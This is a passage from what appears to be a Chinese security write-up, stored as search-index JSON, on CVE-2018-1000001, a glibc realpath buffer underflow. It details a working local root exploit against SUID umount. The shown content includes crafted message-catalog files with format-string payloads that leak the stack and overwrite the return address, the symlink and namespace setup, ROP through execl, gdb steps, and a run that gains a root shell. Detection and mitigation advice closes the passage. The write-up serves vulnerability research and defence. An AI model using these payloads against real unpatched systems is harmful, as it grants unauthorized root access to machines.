namespace\u7684\u5b50\u8fdb\u7a0b\n  \u5b50\u8fdb\u7a0b\u542f\u52a8\u540e\uff0c\u4f1a\u5148\u7b49\u5f85\u7236\u8fdb\u7a0b\u5c06\u5176uid\u548cgid\u8bbe\u7f6e\u4e3a0(\u5f53\u524dnamespace)\n  \u7136\u540emount tmpfs\u5230/tmp\u76ee\u5f55\uff0c\u5e76\u5207\u6362\u5230/tmp\u4f5c\u4e3a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\n  \u521b\u5efa\u4e00\u4e2aready\u6587\u4ef6(O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY)\n\n\n\n\n\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4fe1\u606f\n\n\n\n\n\n\n\u5728clone\u51fa\u7684\u5b50\u8fdb\u7a0b\u5de5\u4f5c\u76ee\u5f55(/proc/[pid]/cwd)\u4e2d\u751f\u6210\u4e00\u7cfb\u5217\u6587\u4ef6\u548c\u76ee\u5f55\n\n\n\n\n\n\n\u751f\u6210\u7684\u6587\u4ef6\u5982\u4e0b\uff1a\n\n\ninvincible@ubuntu:/proc/10013/cwd$ tree\n.\n\u251c\u2500\u2500 DATEMSK\n\u251c\u2500\u2500 ready\n\u2514\u2500\u2500 (unreachable)\n    \u251c\u2500\u2500 tmp\n    \u2502   \u251c\u2500\u2500 down -> ../x/../../AAA(\u7701\u7565...)A/AAA(\u7701\u7565...)A/A\n    \u2502   \u2514\u2500\u2500 from_archive\n    \u2502       \u251c\u2500\u2500 C.UTF-8\n    \u2502       \u2502   \u2514\u2500\u2500 LC_MESSAGES\n    \u2502       \u2502       \u2514\u2500\u2500 util-linux.mo\n    \u2502       \u251c\u2500\u2500 X.x\n    \u2502       \u2502   \u2514\u2500\u2500 LC_MESSAGES\n    \u2502       \u2514\u2500\u2500 X.X\n    \u2502           \u2514\u2500\u2500 LC_MESSAGES\n    \u2502               \u2514\u2500\u2500 util-linux.mo\n    \u2514\u2500\u2500 x\n\n\n10 directories, 5 files \ninvincible@ubuntu:/proc/10013/cwd$ cat DATEMSK \n#!/home/invincible/Desktop/test/exp\nunused\ninvincible@ubuntu:/proc/10013/cwd$ file DATEMSK \nDATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executable\n\ninvincible@ubuntu:/proc/10013/cwd$ \ninvincible@ubuntu:/proc/10013/cwd$ file ready \nready: empty\n\n\ninvincible@ubuntu:/proc/10013/cwd$ file \\(unreachable\\)/tmp/from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo \n(\u7701\u7565...)/util-linux.mo: GNU message catalog (little endian), revision 0.0, 4 messages\n\n\ninvincible@ubuntu:/proc/10013/cwd$ file \\(unreachable\\)/tmp/from_archive/X.X/LC_MESSAGES/util-linux.mo \n(\u7701\u7565...)/util-linux.mo: fifo (named pipe)\n\n\n\n\n\n\u6784\u9020\u7684DATEMSK\u6587\u4ef6\u5185\u5bb9\u4e3a/proc/self/exe\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u7684\u6587\u4ef6:\n\n\ninvincible@ubuntu:/proc/10013/cwd$ cat DATEMSK \n#!/home/invincible/Desktop/test/exp\nunused\ninvincible@ubuntu:/proc/10013/cwd$ file DATEMSK \nDATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executabl\n\n\n\n\n\n\u6784\u9020\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\u5185\u5bb9:\n\n\ninvincible@ubuntu:~/Desktop/test$ msgunfmt util-linux.mo -o util-linux.po\ninvincible@ubuntu:~/Desktop/test$ cat util-linux.po \nmsgid \"\"\nmsgstr \"\"\n\"Language: en\\n\"\n\"MIME-Version: 1.0\\n\"\n\"Content-Type: text/plain; charset=UTF-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\n\nmsgid \"%s: mountpoint not found\"\nmsgstr \"1234\"\n\n\nmsgid \"%s: not mounted\"\nmsgstr \"\"\n\"AA%6$lnAAAAAA%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx\"\n(\u7701\u7565... \u5171256\u4e2a%16lx)\n\"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx\"\n\"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%1$68hhx%256$hhn\"\n\n\nmsgid \"\"\n\"%s: target is busy\\n\"\n\"        (In some cases useful info about processes that\\n\"\n\"         use the device is found by lsof(8) or fuser(1).)\"\nmsgstr \"5678\"\ninvincible@ubuntu:~/Desktop/test$ \n\n\n\n\n\n\u63d0\u6743\u9636\u6bb5(attemptEscalation)\n\n\n\n\n\n\n\u51c6\u5907\u5de5\u4f5c\n\n\n\n\n\n\n\u521b\u5efa\u7528\u4e8e\u548c\u5b50\u8fdb\u7a0b\u901a\u4fe1\u7684pipe\u7528\u4e8e\u8bfb\u53d6\u5b50\u8fdb\u7a0bstdout\u548cstderr\n\n\n\n\n\n\nfork\u51fa\u5b50\u8fdb\u7a0b(\u4e0b\u6587\u79f0umout\u8fdb\u7a0b)\uff0c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u8bbe\u7f6epipe\uff0c\u5207\u6362\u5230us_proc\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\uff0cexecve\u6267\u884cumount\uff0c\u5177\u4f53\u6267\u884c\u547d\u4ee4\uff1a\n\n\n```shell\nAANGUAGE=X.X AANGUAGE=X.X (\u7701\u7565...\u5171255\u6b21) LC_ALL=C.UTF-8 /bin/umount  /run /run /run /run /run /run /run /run /run /run down LABEL=78 LABEL=789 LABEL=789a LABEL=789ab LABEL=789abc LABEL=789abcd LABEL=789abcde LABEL=789abcdef LABEL=789abcdef0 LABEL=789abcdef0\n\n\n```\n\n\n\n\n\n\n\u5f00\u59cb\u63d0\u6743\n\n\n\n\n\n\n\u7b2c0\u6b65\uff0c\u7236\u8fdb\u7a0b\u5f00\u59cb\u6301\u7eed\u8bfb\u53d6umount\u8fdb\u7a0b\u7684\u8f93\u51fa\uff0c\u7b49\u5f85\"AAAAAAAA\"\u5b57\u7b26\u4e32\u7684\u51fa\u73b0\n\n\n\n\n\u7b2c1\u6b65\uff0c\u8bfb\u53d6\u5b8c\u6574\u7684\u6808\u5185\u5b58\u6570\u636e\uff0c\u5e76\u5f00\u59cb\u89e3\u6790\uff0c\u6784\u9020\u7b2c\u4e8c\u9636\u6bb5\u7684util-linx.mo\u6587\u4ef6\u5185\u5bb9\u5e76\u5199\u5165\n\n\n\u7b2c2\u6b65\uff0c\u6301\u7eed\u7b49\u5f85\uff0c\u76f4\u5230\u5728\u8d85\u65f6\u65f6\u95f4\u5185\uff0c\u7b2c\u4e8c\u9636\u6bb5util-linux.mo\u6587\u4ef6\u5185\u5bb9\u88abumount\u8bfb\u53d6\n\n\n\u7b2c3\u6b65\uff0c\u8bfb\u53d6\u5269\u4e0b\u7684umount\u8f93\u51fa\u9632\u6b62\u5176\u88ab\u963b\u585e\n\n\numount\u542f\u52a8\u540e\uff0c\u89e3\u6790\u7b26\u53f7\u94fe\u63a5down\u4f1a\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u4f7f\u5806\u5185\u5b58\u4e2d\u5b58\u653e\u7684\u6b63\u5e38\u6587\u4ef6\u8def\u5f84\u5931\u6548\uff0c\u8feb\u4f7f\u5176\u52a0\u8f7d\u4f4d\u4e8e\u76f8\u5bf9\u76ee\u5f55C.UTF-8/LC_MESSAGES/\u4e2d\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\uff0c\u5176\u4e2d\u7684 poisonous format string \u4f1a\u5c06\u6808\u5185\u5b58dump\u5230stderr\uff0c\u540c\u65f6\u8fd8\u4f1a\u901a\u8fc7\u6307\u5411\u73af\u5883\u53d8\u91cf\u7684\u6307\u9488\uff0c\u5c06\"AANGUAGE=X.X\"\u4fee\u6539\u4e3a\"LANGUAGE=X.X\"\n\n\numount\u7ee7\u7eed\u6267\u884c\uff0c\u7531\u4e8e\u73af\u5883\u53d8\u91cf\u88ab\u4fee\u6539\uff0c\u8fd9\u5c06\u4f7fumount\u8bfb\u53d6\u7b2c\u4e8c\u9636\u6bb5\u7684util-linux.mo\u6587\u4ef6(\u4f4d\u4e8eX.X/LC_MESSAGES\u76ee\u5f55\u4e0b\uff0c\u7531\u4e8e\u8be5\u6587\u4ef6\u4e3afifo named pipe\uff0c\u6240\u4ee5\u8fd9\u91ccumoun\u4f1a\u963b\u585e\u7b49\u5f85\u5176\u88ab\u5199\u5165\u6570\u636e)\n\n\n\n\numount\u8fdb\u7a0b\u5728\u7236\u8fdb\u7a0b\u7b2c1\u6b65\u5b8c\u6210\u540e\u6062\u590d\u6267\u884c\uff0c\u8bfb\u53d6\u7b2c\u4e8c\u9636\u6bb5mo\u6587\u4ef6\uff0c\u5176\u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5c06\u4f1a\u4fee\u6539umount\u7684\u8fd4\u56de\u5730\u5740\uff0c\u901a\u8fc7setdate+execl\u5b9e\u73b0ROP\uff0c\u6700\u7ec8\u6267\u884cDATEMSK\u6587\u4ef6\u4e2d\u7684exp\u8fdb\u7a0b\uff0c\u5229\u7528umount\u63d0\u5347exp\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6743\u9650\u540e\u6267\u884c\uff0c\u751f\u6210root shell\u5b8c\u6210\u63d0\u6743\n\n\n\n\n\n\ndump\u6808\u5185\u5b58\uff0c\u4fee\u6539restricted\u5b57\u6bb5\uff0c\u4fee\u6539AANGUAGE\u73af\u5883\u53d8\u91cf\u4f7f\u7528\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\n\n\n\nshell\n  \"AA%6$lnAAAAAA%016lx(\u7701\u7565... \u5171256\u4e2a%016lx)%016lx%1$68hhx%256$hhn\"\n\n\n\n\n\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4f7f\u7528\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\n\n```shell\n  debian@debian:~/Desktop/work$ msgunfmt \"/proc/1609/cwd/(unreachable)/tmp/__gconv_find_shlib/X.x/LC_MESSAGES/util-linux.mo\" -o util-linux.po\n  debian@debian:~/Desktop/work$ cat util-linux.po \n  msgid \"\"\n  msgstr \"\"\n  \"Language: en\\n\"\n  \"MIME-Version: 1.0\\n\"\n  \"Content-Type: text/plain; charset=UTF-8\\n\"\n  \"Content-Transfer-Encoding: 8bit\\n\"\n\n\nmsgid \"%s: mountpoint not found\"\n  msgstr \"\"\n  \"%67$hn%71$hn%1$18640.18640s%68$hn%1$13200.13200s%64$hn%1$906.906s%66$hn%70$hn\"\n  \"%1$1567.1567s%65$hn%1$1.1s%69$hn%1$31222.31222s%1$5414.5414s%1$s%1$s%63$hn\"\n  \"%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx-%62$lx-%63$lx-%64$lx-\"\n  \"%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$s\\n\"\n\n\nmsgid \"%s: not mounted\"\n  msgstr \"BBBB5678%3$s\\n\"\n\n\nmsgid \"\"\n  \"%s: target is busy\\n\"\n  \"        (In some cases useful info about processes that\\n\"\n  \"         use the device is found by lsof(8) or fuser(1).)\"\n  msgstr \"BBBBABCD%s\\n\"\n\n\n```\n\n\nb.EXP\u6e90\u7801\n\n\n\u200b   \u590d\u73b0\u73af\u5883exp: \u89c1\u9644\u4ef6cve-2018-1000001-01.md\n\n\n\u200b   \u539f\u4f5c\u8005exp: \nexp.c\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePOC\u4e2d\u7684\u73af\u5883\u76f8\u540c\n\n\n\n\n\n\n\u6b65\u9aa4\u4e00 \u8bbe\u7f6eunprivileged_userns_clone\u6743\u9650\n\n\n\n\n\n\nshell\n   # \u5c06unprivileged_userns_clone\u8bbe\u7f6e\u4e3a1(\u9ed8\u8ba4\u4e3a0)\n   root$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n\n\n\n\n\u6b65\u9aa4\u4e8c  \u7f16\u8bd1exp\u6587\u4ef6\n\n\n\n\n\u4f7f\u7528\u7684\u662f\u4fee\u6539\u8fc7\u7684exp\uff0c\u5177\u4f53\u4fee\u6539\u4e86\u52a0\u8f7dmo\u7684\u76ee\u5f55\u548cexecl\u7684\u76f8\u5bf9\u504f\u79fb\u4ee5\u9002\u914d\u590d\u73b0\u73af\u5883\n\n\nshell\n  gcc exp.c -o exp\n\n\n\n\n\u6b65\u9aa4\u4e09 \u6267\u884cexp\n\n\n\n\n```shell\n  debian@debian:~/Desktop/work$ id\n  uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner)\n  debian@debian:~/Desktop/work$ ./exp\n  ./exp: invoked as SUID, invoking shell ...\n  root@debian:~/Desktop/work# id\n  uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner),1000(debian)\n  root@debian:~/Desktop/work# \n\n\n```\n\n\n\n\n\u5982\u4f55\u83b7\u53d6util-linx.mo\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\n\n\n\n\n```shell\n  # \u5b9a\u4f4d\u5230_nl_find_msg\u8c03\u7528\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\n  char \n_nl_find_msg (struct loaded_l10nfile \ndomain_file,\n            struct binding \ndomainbinding, const char \nmsgid,\n            int convert, size_t *lengthp)\n       internal_function;\n\n\n# Terminal 1\n  /usr/bin/unshare -m -U --map-root-user /bin/bash\n  mount -t tmpfs tmpfs /tmp\n  cd /tmp\n  chmod 00755 .\n  mkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/xxx/C.UTF-8.utf8/LC_MESSAGES\" \"(unreachable)/x\" \n  ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\n  echo $$\n  46416\n\n\n# Terminal 2\n  cd /proc/46416/cwd\n  gdb\n  file /bin/umount\n  set args --lazy down \n  set env LC_ALL=C.UTF-8\n  b main\n  r\n  b \numount_one if \n(char \n)$rsi == '('\n  c\n  b mk_exit_code\n  c\n  b \n__dcigettext+1265\n  c\n\n\n# \u901a\u8fc7\u8c03\u7528\u4fe1\u606f\u627e\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\n  \"(unreachable)/tmp/\ngconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\"\n  # \u56e0\u6b64\u76f8\u5bf9\u8def\u5f84\u5e94\u6539\u4e3a\uff1a\ngconv_find_shlib(\u539fexp\u4e2d\u662ffrom_archive)\n  [---------------------------------registers-------------------------\n  ...\n  RCX: 0x1 \n  RDX: 0x55698c49ee78 (\"%s: not mounted\")\n  RSI: 0x55698e233200 (\"AAAAAA/A\")\n  RDI: 0x55698e23be90 --> 0x55698e23c3b0 (\"(unreachable)/tmp/\ngconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\")\n  ...\n  R8 : 0x7fff5515b1b8 --> 0x7fb5d5b84000 --> 0x7fb5d572e000 --> 0x10102464c457f \n  ...\n  [-------------------------------------code-------------------------\n  ...\n  => 0x7fb5d4d69d21 <\ndcigettext+1265>:    call   0x7fb5d4d68bc0 <_nl_find_msg>\n   ...\n  Guessed arguments:\n  arg[0]: 0x55698e23be90 --> 0x55698e23c3b0 (\"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\")\n  arg[1]: 0x55698e233200 (\"AAAAAA/A\")\n  arg[2]: 0x55698c49ee78 (\"%s: not mounted\")\n  arg[3]: 0x1 \n  arg[4]: 0x7fff5515b1b8 --> 0x7fb5d5b84000 --> 0x7fb5d572e000 --> 0x10102464c457f \n\n\nBreakpoint 4, 0x00007fb5d4d69d21 in __dcigettext (\n  ...\n  gdb-peda$ \n\n\n# \u8c03\u7528\u6808\u5982\u4e0b\n  gdb-peda$ bt\n  #0  0x00007fb5d4d69d21 in \ndcigettext (\n      domainname=0x55698e233580 \"util-linux\", \n      msgid1=0x55698c49ee78 \"%s: not mounted\", \n      msgid2=0x0, plural=0x0, n=0x0, \n      category=0x5) at dcigettext.c:742\n  #1  0x000055698c49d68d in mk_exit_code (cxt=0x55698e2335a0, rc=0xffffffff)\n      at sys-utils/umount.c:206\n  #2  0x000055698c49dba1 in umount_one (cxt=0x55698e2335a0, spec=...\n  #3  0x000055698c49d152 in main (argc=0x0, argc@entry=0x3, ...\n  #4  0x00007fb5d4d5c2e1 in \nlibc_start_main (main=0x55698c49c970 ...\n  #5  0x000055698c49d3aa in _start ()\n\n\n```\n\n\n\n\n\u5982\u4f55\u5728umount\u4e2ddump\u6808\u5185\u5b58\u7684\u4f4d\u7f6e\u4e0b\u65ad\u70b9\n\n\n\n\n```shell\n  gcc my_exp.c -o exp4dbg -g\n  gdb\n  file exp4dbg\n  b main\n  r\n  set follow-fork-mode parent\n  b attemptEscalation\n  c\n  set follow-fork-mode child\n  c\n  b \numount_one if \n(char \n)$rsi == '('\n  c\n  b mk_exit_code\n  c\n  b \nmk_exit_code+165\n  c\n\n\n=> 0x561465315695 \n: call   0x561465314560 \nwarnx@plt\n\n\ngdb-peda$ bt\n  #0  0x0000561465315695 in mk_exit_code (cxt=0x5614658005a0, ...\n  #1  0x0000561465315ba1 in umount_one (cxt=0x5614658005a0, spec=...\n  #2  0x0000561465315152 in main (argc=0xa, argc@entry=0x16, \n  ...\n  #3  0x00007f29943012e1 in __libc_start_main (main=0x561465314970 ...\n  #4  0x00005614653153aa in _start ()\n  gdb-peda$ \n\n\n```\n\n\nd.\u5229\u7528\u6838\u5fc3\u8981\u7d20\n\n\n\n\n\n\n\u5229\u7528\u8d8a\u754c\u5199\u6f0f\u6d1e\uff0c\u63a7\u5236gettext\u51fd\u6570\u52a0\u8f7d\u7279\u5236\u7684NLS\u6587\u4ef6\uff0c\u63a7\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32dump\u6808\u5185\u5b58\u6839\u636e\u6808\u5185\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6libc\u57fa\u5730\u5740\u7ed5\u8fc7ASLR\n\n\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4fee\u6539\u6808\u5185\u5b58\u51fd\u6570\u53c2\u6570\u548c\u8fd4\u56de\u5730\u5740\u8fdb\u800c\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\n\n\n\n\n\n\n\u901a\u8fc7setdate\u8fd9\u6837\u7684\u7b80\u5355\u51fd\u6570\u4e3aexecl\u6784\u9020\u5408\u9002\u7684\u6808\u73af\u5883\u5b9e\u73b0ROP\n\n\n\n\n\n\n\u901a\u8fc7\u63a7\u5236suid\u8fdb\u7a0bumount\u7684\u6267\u884c\u6d41\u7a0b\u6765\u521b\u5efaroot shell\u5b9e\u73b0\u63d0\u6743\n\n\n\n\n\n\n5.\u9632\u62a4\u5efa\u8bae\n\n\n\n\n\u68c0\u67e5\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u98ce\u9669\uff0c\u53ca\u65f6\u66f4\u65b0\u7cfb\u7edf\uff0c\u5b89\u88c5\u8865\u4e01\u3002\u68c0\u6d4b\u65b9\u5f0f\u5982\u4e0b\uff1a\n\n\n\n\n```shell\n  # \u65b9\u5f0f\u4e00\uff1a\n  # Terminal 1\n  $ sudo echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n  $ /usr/bin/unshare -m -U --map-root-user /bin/bash\n  $ mount -t tmpfs tmpfs /tmp\n  $ cd /tmp\n  $ echo $$\n  2607\n\n\n# Terminal 2\n  $ cd /proc/2607/cwd\n  $ realpath .\n  (unreachable)/tmp\n  # \u5982\u679c\u8fd4\u56de\u503c\u5305\u542b(unreachable)\u5b57\u7b26\u4e32\u5219\u53ef\u4ee5\u5224\u65ad\u5b58\u5728\u98ce\u9669\n\n\n# \u65b9\u5f0f\u4e8c\uff1a\n  # \u67e5\u770bglibc\u7684package\u66f4\u65b0\u65e5\u5fd7\u662f\u5426\u5b58\u5728CVE-2018-1000001\u7684\u8865\u4e01\n  # \u4ee5\u5b89\u88c5\u4e86\u8865\u4e01\u7684ubuntu16\u4e3a\u4f8b\uff1a\n  $ PAGER=cat apt-get -q=2 changelog libc6\n  ...\n    * SECURITY UPDATE: Buffer underflow in realpath()\n      - debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:\n        Make getcwd(3) fail if it cannot obtain an absolute path\n      - CVE-2018-1000001\n  ...\n\n\n```\n\n\n\n\n\n\n\u6839\u636e\u5206\u6790\uff0c\u8be5\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u5f00\u542funprivileged_userns_clone\u6743\u9650\uff0c\u6240\u4ee5\u5728\u7d27\u6025\u60c5\u51b5\u4e0b\uff0c\u6700\u5feb\u901f\uff0c\u65b9\u4fbf\u7684\u9632\u62a4\u65b9\u5f0f\u662f\u68c0\u67e5\u8be5\u914d\u7f6e\uff0c\u5e76\u786e\u4fdd\u5176\u5728\u4e0d\u9700\u8981\u7684\u60c5\u51b5\u4e0b\u5173\u95ed\u4ee5\u963b\u65ad\u6f0f\u6d1e\u5229\u7528\u7684\u57fa\u7840(\u4f46\u662f\u6b64\u914d\u7f6e\u662f\u67d0\u4e9b\u5bb9\u5668\u5e94\u7528\u7684\u57fa\u7840)\u3002\n\n\n\n\n\n\n\u7531\u4e8e\u6f0f\u6d1e\u5229\u7528\u901a\u8fc7\u8bed\u8a00\u652f\u6301\u6587\u4ef6\u5b9e\u73b0\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6ce8\u5165\uff0c\u56e0\u6b64\u76d1\u63a7\u7cfb\u7edf\u7684\u8bed\u8a00\u652f\u6301\u6587\u4ef6\u80fd\u591f\u8d77\u5230\u4e00\u5b9a\u4f5c\u7528\u3002\u4f8b\u5982\uff0c\u76d1\u63a7\u8fdb\u7a0b\u8bfb\u53d6\u548c\u521b\u5efa\u7684.mo\u6587\u4ef6\u662f\u5426\u6709\u5f02\u5e38\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32(\u6bd4\u5982\u5305\u542b%n, %$\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32)\uff0c\u53ef\u4ee5\u53ea\u5728\u521b\u5efa\u7684\u65f6\u5019\u68c0\u6d4b\u51cf\u5c11\u6027\u80fd\u635f\u5931\uff1a\n\n\n\n\n\n\nshell\n  root@debian:/usr/share/locale/gl/LC_MESSAGES/# file util-linux.mo\n  util-linux.mo: GNU message catalog (little endian), revision 0.0, 214 messages\n\n\n6.\u53c2\u8003\n\n\nLibcRealpathBufferUnderflow\n\nhttps://www.freebuf.com/column/162202.html\nhttps://bbs.pediy.com/thread-228678.htm",
            "title": "Cve 2018 1000001"
        },
        {
            "location": "/cve-2018-1000001/#cve-2018-1000001",
            "text": "",
            "title": "cve-2018-1000001"
        },
        {
            "location": "/cve-2018-1000001/#0",
            "text": "invincible1944@gmail.com",
            "title": "0.\u4f5c\u8005"
        },
        {
            "location": "/cve-2018-1000001/#1",
            "text": "\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6   glibc <= 2.26    GLibc\u7b80\u4ecb    GNU/Linux systems\u7b49\u4f7f\u7528Linux\u5185\u6838\u7cfb\u7edf\u7684\u6838\u5fc3C\u4ee3\u7801\u5e93    \u8fd9\u4e9b\u4ee3\u7801\u5e93\u63d0\u4f9b\u4e25\u683c\u9075\u5faaISO C11, POSIX.1-2008, BSD\u7b49\u6807\u51c6\u7684API    \u8fd9\u4e9bAPI\u5305\u542b open, read, write, malloc, printf\u7b49\u57fa\u672c\u51fd\u6570    \u53c2\u8003\u4e00(GLIBC \u5b98\u7f51) ,  \u53c2\u8003\u4e8c(Linux manual)    \u6f0f\u6d1e\u5371\u5bb3    \u5bf9\u672a\u5b89\u88c5\u8865\u4e01\u7684Linux\u7cfb\u7edf\u8fdb\u884c\u672c\u5730\u63d0\u6743\u3002  Known Affected Software Configurations   \u5176\u4ed6\u5bf9\u4e86\u89e3\u6f0f\u6d1e\u6709\u5229\u7684\u80cc\u666f\u77e5\u8bc6   namespaces     user_namespaces    mount_namespaces  setlocale - set the current locale  Gettext  \u683c\u5f0f\u5316\u5b57\u7b26\u4e32",
            "title": "1.\u80cc\u666f\u4ecb\u7ecd"
        },
        {
            "location": "/cve-2018-1000001/#2",
            "text": "\u6f0f\u6d1e\u539f\u7406   \u7f13\u51b2\u533a\u8fb9\u754c\u5224\u65ad\u4e0d\u4e25\u683c\u9020\u6210\u8d8a\u754c\u5199\u3002   \u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c   \u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1aglibc <= 2.26  \u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a glibc-2.26/stdlib/canonicalize.c -> __realpath( line 122, 199 )  GLibc \u5b98\u7f51 GLibc \u6e90\u7801\u5e93   \u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b   CWE-787: Out-of-bounds Write   \u6f0f\u6d1e\u8865\u4e01   glibc upstream   \u6f0f\u6d1eCVE\u53f7   CVE-2018-1000001",
            "title": "2.\u6f0f\u6d1e\u5206\u6790"
        },
        {
            "location": "/cve-2018-1000001/#3poc",
            "text": "",
            "title": "3.POC"
        },
        {
            "location": "/cve-2018-1000001/#apoc",
            "text": "\u6784\u9020\u7279\u6b8a\u7684namespace\u8fdb\u7a0b(\u4e0b\u6587\u79f0ns_proc)\uff0c\u5e76\u5728\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u6784\u5efa\u7279\u6b8a\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u5305\u542b\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u548c\u7279\u5236\u7684NLS\u6587\u4ef6    \u4f7fumount\u5728ns_proc\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u8fd0\u884c\uff0c\u5378\u8f7d\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u8986\u76d6setloacle\u9700\u8981\u52a0\u8f7d\u7684\u6b63\u5e38\u6587\u4ef6\u8def\u5f84\uff0c\u8feb\u4f7f\u5176\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u52a0\u8f7d\u7279\u5236\u7684 NLS\u6587\u4ef6    \u7279\u5236NLS\u6587\u4ef6\u80fd\u591f\u63a7\u5236umount\u7684error\u4fe1\u606f\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u5229\u7528%n\u83b7\u53d6\u5199\u5165\u6808\u5185\u5b58\u7684\u80fd\u529b\uff0c\u800c\u521a\u597d\u80fd\u591f\u4fee\u6539umount libmnt_context\u7ed3\u6784\u4f53\u7684restricted\u6807\u5fd7\u4f4d\uff0c\u4f7fumount\u8ba4\u4e3a\u8c03\u7528\u8005\u4e3aroot\u6743\u9650\uff0c\u8fdb\u800c\u5141\u8bb8\u540e\u7eed\u7684umout / \u64cd\u4f5c\uff0c\u4ece\u800c\u5b9e\u73b0DOS",
            "title": "a.POC\u539f\u7406"
        },
        {
            "location": "/cve-2018-1000001/#bpoc",
            "text": "\u89c1\u9644\u4ef6: cve-2018-1000001-01.md",
            "title": "b.POC\u6e90\u7801"
        },
        {
            "location": "/cve-2018-1000001/#c",
            "text": "\u590d\u73b0\u73af\u5883    \u73af\u5883\u4fe1\u606f   \u7cfb\u7edf\u7248\u672c: Linux debian 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux  \u53d1\u884c\u7248\u540d\u79f0: Debian GNU/Linux 9 (stretch)  glibc\u7248\u672c:  Debian GLIBC 2.24-11+deb9u4  gcc\u7248\u672c:  gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516  umount\u7248\u672c: umount from util-linux 2.29.2   \u955c\u50cf\u4e0b\u8f7d\u5730\u5740\uff1a debian-9.12.0-amd64-DVD-1.iso  \u865a\u62df\u673a\u8f6f\u4ef6\uff1aVMwareFusion \u4e13\u4e1a\u7248 11.5.1 (15018442)  \u865a\u62df\u673a\u8f6f\u4ef6\uff1aQEMU emulator version 4.2.0     QEMU\u865a\u62df\u673a\u642d\u5efa\u6b65\u9aa4  ```shell",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/cve-2018-1000001/#1_1",
            "text": "",
            "title": "1. \u53bb\u4e0a\u9762\ud83d\udc46\u7ed9\u51fa\u7684\u5730\u5740\u5904\u4e0b\u8f7d\u955c\u50cf"
        },
        {
            "location": "/cve-2018-1000001/#2_1",
            "text": "$ qemu-img create -f qcow2 debian9.img 10G",
            "title": "2. \u521b\u5efa\u865a\u62df\u673a\u786c\u76d8"
        },
        {
            "location": "/cve-2018-1000001/#3-enable-kvm",
            "text": "",
